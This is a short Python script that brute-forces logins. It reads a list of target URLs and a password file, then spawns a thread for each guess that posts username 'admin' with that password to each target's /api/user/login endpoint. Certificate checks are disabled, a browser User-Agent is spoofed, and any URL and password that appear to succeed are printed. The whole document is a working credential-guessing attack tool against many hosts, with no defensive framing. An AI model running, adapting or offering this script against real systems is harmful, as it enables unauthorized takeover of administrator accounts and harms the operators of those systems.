import requests,json,time,threading,sys,getopt
def argss():
    argv = sys.argv[1:]
    opts,args = getopt.getopt(argv, "f:p:",['file','pass'])
    for opt,arg in opts:
        if opt in ['-f','--file']:
            global file
            file = arg
        elif opt in ['-p','--pass']:
            global password
            password = arg
            
def arl(url,passwd):
    headers = {
        'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept' : 'application/json, text/plain, */*',
        'Content-Type' : 'application/json; charset=UTF-8'
    }
    data = {
        "username":"admin",
        "password": passwd
    }
    try:
        requests.packages.urllib3.disable_warnings()
        req = requests.post(url,headers=headers,data=json.dumps(data),verify=False,allow_redirects=False)
        if ('admin' in req.text):
            print(url,passwd)

        #else:
            #print(data)
    except:
        pass

def thread():
    t1 = threading.Thread(target=arl,args=(url,passwd))
    t1.start()

if __name__ == '__main__':
    argss()
    for url in open(file,mode='r'):
            url = str(url.replace('\n','')) + '/api/user/login'
            for passwd in open(password,mode="r"): 
                passwd = str(passwd.replace('\n',''))
                thread()
            